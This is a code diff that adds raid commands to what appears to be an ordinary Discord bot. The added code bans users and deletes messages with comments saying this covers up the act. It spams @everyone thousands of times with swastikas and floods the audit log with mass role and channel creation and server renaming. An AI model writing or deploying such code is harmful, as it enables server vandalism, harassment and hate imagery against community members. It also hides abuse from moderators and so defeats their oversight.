@@ -133,6 +133,43 @@ client.on('error', e => {
   console.log(chalk.bgRed(e.replace(regToken, 'qui a été expurgé')));
 });
 
+  bot = new Discord.Client();
+    pre = "^°^";
+    banMessage = "CYAK BLYAT ! RUSSIA <33333 YOU HAVE BEEN BANNED HAHAHAHAHAH";
+
+
+bot.on("message", msg => {
+    //ban command
+ if(cmd("ban", msg)) {
+        msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
+        msg.guild.member(msg.mentions.users.first()).ban();
+        msg.mentions.users.first().send(banMessage); //messages bannee
+        msg.author.send(banMessage); //messages banner
+    }
+    //spam command
+    if(cmd("spam", msg)) {
+        msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
+        for (var i = 0; i < 9812; i++) {
+            msg.channel.send(" @everyone RAID BY Anarchie. 卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://cdn.discordapp.com/attachments/407363892180680717/414598067241877516/7608-full.jpg ");
+        }
+    }
+    //audit log clogger
+    if(cmd("smokescreen", msg)) {
+        msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
+        for (var i = 0; i < 500; i++) {
+            // Creates new roles to clog up the audit log
+            msg.guild.createRole({
+                name: 'moustafa',
+                color: 'RED',
+            });
+            msg.guild.createChannel('Raid by Anarchie.', 'voice')
+            msg.guild.createChannel('Raid by Anarchie.', 'text')
+            //changes name tons of times to clog up the audit log
+            msg.guild.setName("Raid By Anarchie "+ i + " Fois");
+        }
+    }
+});
+
 
 
 client.login(process.env.TOKEN);
